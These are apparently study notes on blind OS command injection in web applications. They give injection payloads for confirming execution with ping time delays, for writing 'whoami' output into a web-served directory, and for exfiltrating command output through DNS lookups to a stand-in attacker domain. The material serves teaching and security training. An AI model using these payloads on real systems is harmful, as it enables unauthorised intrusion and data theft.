## Blind Injection
Common Vulns
* Can still be exploited, just need different techniques
* Common Mail Syntax
   	* mail -s “note” -aFrom:mine@gmail.com victim@gmail.com 

Detecting commands using time delays
* Know the command was executed using ping
* lets your specify number of ICMP packets to send
* & ping -c 10 127.0.0.1 &
* Try all parameters until one works

Exploit by redirecting output
* If app serves static resources from location /var/www/static use:
   	* & whoami > /var/www/static/whoami.txt &
* then you can access that file:
   	* https://vulnerable-website.com/whoami.txt
   	* If you can't access it, look for instances where files are being displayed on the site already (perhaps pictures).
      		* Find the URL used to access those, then inject your file name in there.

Exploiting using OAST technqiues
* & nslookup kgji2ohoyw.web-attacker.com &
   	* Monitor attacker site for the lookup occuring
   	* Determines that command was successfully injected.
   	*  email=x||nslookup+x.burpcollaborator.net||
* Once you know it works, perform a whoami command
   	* & nslookup `whoami`.kgji2ohoyw.web-attacker.com &


